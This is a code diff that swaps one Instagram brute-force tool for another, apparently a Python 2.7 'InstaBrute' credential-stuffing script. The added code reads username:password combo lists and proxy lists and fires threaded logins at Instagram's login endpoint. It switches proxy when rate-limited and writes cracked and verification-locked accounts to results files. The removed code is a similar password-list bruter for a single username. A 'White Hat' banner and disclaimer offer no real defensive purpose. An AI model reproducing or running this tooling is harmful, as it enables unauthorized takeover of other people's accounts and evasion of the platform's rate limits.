@@ -1,132 +1,138 @@
-# Date: 12/29/2018
-# Author: Mohamed
-# Description: Instagram bruter
+#!/usr/bin/python2.7
+import requests, sys, threading, time, os, random
+from random import randint
+CheckVersion = str(sys.version)
 
-from sys import exit
-from os.path import exists
-from lib.bruter import Bruter
-from lib.display import Display
-from platform import python_version
-from lib.const import credentials, modes
-from argparse import ArgumentParser, ArgumentTypeError
+r = '\033[31m'
+g = '\033[32m'
+y = '\033[33m'
+b = '\033[34m'
+m = '\033[35m'
+c = '\033[36m'
+w = '\033[37m'
+rr = '\033[39m'
 
 
-class Engine(object):
 
-    def __init__(self, username, threads, passlist_path, is_color):
-        self.bruter = None
-        self.resume = False
-        self.is_alive = True
-        self.threads = threads
-        self.username = username
-        self.passlist_path = passlist_path
-        self.display = Display(is_color=is_color)
 
-    def passlist_path_exists(self):
-        if not exists(self.passlist_path):
-            self.display.warning('Invalid path to password list')
-            return False
-        return True
+class InstaBrute(object):
+    def __init__(self):
+        self.cls()
+        self.print_logo()
+        try:
+            Combo = raw_input(' Combo.txt --> ')
+            Proxy = raw_input(' Proxy.txt --> ')
+            self.cls()
+            self.print_logo()
+        except:
+            self.cls()
+            self.print_logo()
+            print('  [-] Error : SomeThing Not true!')
+            sys.exit()
 
-    def create_bruter(self):
-        self.bruter = Bruter(
-            self.username,
-            self.threads,
-            self.passlist_path
-        )
-
-    def get_user_resp(self):
-        return self.display.prompt('Would you like to resume the attack? [y/n]: ')
-
-    def write_to_file(self, password):
-        with open(credentials, 'at') as f:
-            data = 'Username: {}\nPassword: {}\n\n'.format(
-                self.username.title(), password)
-            f.write(data)
-
-    def start(self):
-        if not self.passlist_path_exists():
-            self.is_alive = False
-
-        if self.is_alive:
-            self.create_bruter()
-
-            while self.is_alive and not self.bruter.password_manager.session:
-                pass
-
-            if not self.is_alive:
-                return
-
-            if self.bruter.password_manager.session.exists:
-                try:
-                    resp = self.get_user_resp()
-                except:
-                    self.is_alive = False
-
-                if resp and self.is_alive:
-                    if resp.strip().lower() == 'y':
-                        self.bruter.password_manager.resume = True
-
+        self.proxylist = list(open(Proxy).read().splitlines())
+        with open(Combo, 'r') as x:
+            Combolist = x.read().splitlines()
+        thread = []
+        self.Coutprox = 0
+        for combo in Combolist:
+            if self.Coutprox >= len(self.proxylist):
+                self.Coutprox = 0
+            proxy = self.Generate_Proxy(self.Coutprox)
+            self.Coutprox = self.Coutprox + 1
+            user = combo.split(':')[0]
+            password = combo.split(':')[1]
             try:
-                self.bruter.start()
-            except KeyboardInterrupt:
-                self.bruter.stop()
-                self.bruter.display.shutdown(self.bruter.last_password,
-                                             self.bruter.password_manager.attempts, len(self.bruter.browsers))
-            finally:
-                self.stop()
+                t = threading.Thread(target=self.Go, args=(user, password,
+                                                           str(proxy)))
 
-    def stop(self):
-        if self.is_alive:
+                t.start()
+                thread.append(t)
+                time.sleep(0.1)
+            except:
+                pass
+        for j in thread:
+            j.join()
+        input(' BruteForce Is Done! Press Enter to Exit...')
+    def cls(self):
+        linux = 'clear'
+        windows = 'cls'
+        os.system([linux, windows][os.name == 'nt'])
 
-            self.bruter.stop()
-            self.is_alive = False
+    def Generate_Proxy(self, num):
+        return self.proxylist[num]
 
-            if self.bruter.password_manager.is_read and not self.bruter.is_found and not self.bruter.password_manager.list_size:
-                self.bruter.display.stats_not_found(self.bruter.last_password,
-                                                    self.bruter.password_manager.attempts, len(self.bruter.browsers))
+    def print_logo(self):
+        clear = "\x1b[0m"
+        colors = [36, 32, 34, 35, 31, 37]
 
-            if self.bruter.is_found:
-                self.write_to_file(self.bruter.password)
-                self.bruter.display.stats_found(self.bruter.password,
-                                                self.bruter.password_manager.attempts, len(self.bruter.browsers))
+        x = """
+                     White Hat hacker
+                  _____           _        ____             _       
+                 |_   _|         | |      |  _ \           | |      
+                   | |  _ __  ___| |_ __ _| |_) |_ __ _   _| |_ ___ 
+                   | | | '_ \/ __| __/ _` |  _ <| '__| | | | __/ _ |
+                  _| |_| | | \__ \ || (_| | |_) | |  | |_| | ||  __/
+                 |_____|_| |_|___/\__\__,_|____/|_|   \__,_|\__\___|
+                    GitHub.com/04x                    Iran-Cyber.NeT                                                 
+                    
+            Note! : We don't Accept any responsibility for any illegal usage.       
+    """
+        for N, line in enumerate(x.split("\n")):
+            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
+            time.sleep(0.05)
 
+    def Header(self, user, password, sess):
+        headers = {
+            'Host': 'www.instagram.com',
+            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0',
+            'Accept': '*/*',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Referer': 'https://www.instagram.com/',
+            'X-CSRFToken': '',
+            'X-Instagram-AJAX': '1',
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Requested-With': 'XMLHttpRequest',
+            'Content-Length': '',
+            'Cookie': '',
+            'Connection': 'keep-alive'
+        }
+        datas = {'username': user, 'password': password}
+        headers['X-CSRFToken'] = sess.cookies['csrftoken']
+        headers['Cookie'] = "mid={}; csrftoken={}; ig_pr=1; ig_vw=1366".format(sess.cookies['mid'],
+                                                                               sess.cookies['csrftoken'])
+        lenthofData = str(19 + len(datas['username']) + len(datas['password']))
+        headers['Content-Length'] = lenthofData
+        return headers, datas
 
-def valid_int(n):
-    if not n.isdigit():
-        raise ArgumentTypeError('mode must be a number')
+    def Go(self, user, password, proxyz):
+        try:
+            proxy = {'http': proxyz}
+            Heddata = requests.get('https://www.instagram.com', proxies=proxy, timeout=10)
+            sess = requests.session()
+            headers, datas = self.Header(user, str(password), Heddata)
+            GoT = sess.post('https://www.instagram.com/accounts/login/ajax/', headers=headers, data=datas,
+                            proxies=proxy, timeout=10)
+            if 'authenticated": true' in GoT.text:
+                print(g + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> Hacked!')
+                with open('results.txt', 'a') as x:
+                    x.write(user + ':' + password + '\n')
+            elif 'Please wait a few minutes before you try again' in GoT.text:
+                print(' ' + proxyz + ' Banned! --> Changing IP Address...')
+                try:
+                    self.Coutprox = self.Coutprox + 1
+                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
+                except:
+                    self.Coutprox = self.Coutprox - 2
+                    self.Go(user, password, str(self.proxylist[self.Coutprox]))
+            elif 'checkpoint_required' in GoT.text:
+                print(y + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> You Must verfiy!')
+                with open('results_NeedVerfiy.txt', 'a') as x:
+                    x.write(user + ':' + password + '\n')
+            else:
+                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
+        except:
+                print(c + ' IP Attacking ==> ' + proxyz + ' || ' + user + ':' + password + ' --> No!')
 
-    n = int(n)
-
-    if n > 3:
-        raise ArgumentTypeError('maximum for a mode is 3')
-
-    if n < 0:
-        raise ArgumentTypeError('minimum for a mode is 0')
-
-    return n
-
-
-def args():
-    args = ArgumentParser()
-    args.add_argument('username', help='email or username')
-    args.add_argument('passlist', help='password list')
-    args.add_argument('-nc', '--no-color', dest='color',
-                      action='store_true', help='disable colors')
-    args.add_argument('-m', '--mode', default=2, type=valid_int,
-                      help='modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots')
-    return args.parse_args()
-
-
-if __name__ == '__main__':
-
-    if int(python_version()[0]) < 3:
-        print('[!] Please use Python 3')
-        exit()
-
-    arugments = args()
-    mode = arugments.mode
-    username = arugments.username
-    passlist = arugments.passlist
-    is_color = True if not arugments.color else False
-    Engine(username, modes[mode], passlist, is_color).start()
+InstaBrute()
